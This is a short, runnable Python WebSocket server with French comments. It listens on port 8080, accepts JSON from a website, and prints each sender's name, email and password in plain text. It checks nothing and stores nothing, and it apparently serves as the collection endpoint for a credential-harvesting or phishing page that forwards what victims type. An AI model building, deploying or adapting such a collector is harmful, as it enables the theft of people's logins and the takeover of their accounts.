import asyncio
import websockets
import json
from datetime import datetime

async def receive_data(websocket, path):
    print(f"[{datetime.now()}] Nouvelle connexion établie.")
    try:
        async for message in websocket:
            try:
                # On tente de parser le JSON envoyé par le site
                data = json.loads(message)
                
                # Extraction des données
                name = data.get('name', 'N/A')
                email = data.get('email', 'N/A')
                password = data.get('pass', 'N/A')
                
                print(f"--- Données reçues à {datetime.now().strftime('%H:%M:%S')} ---")
                print(f"Nom      : {name}")
                print(f"Email    : {email}")
                print(f"Password : {password}")
                print("-" * 40)
                
            except json.JSONDecodeError:
                # Si le message n'est pas du JSON
                print(f"Message brut reçu : {message}")
                
    except websockets.exceptions.ConnectionClosed:
        print(f"[{datetime.now()}] Connexion fermée par le client.")

async def main():
    print("Serveur WebSocket démarré sur ws://0.0.0.0:8080")
    print("En attente de données...")
    async with websockets.serve(receive_data, "0.0.0.0", 8080):
        await asyncio.Future()  # Exécution permanente

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServeur arrêté par l'utilisateur.")
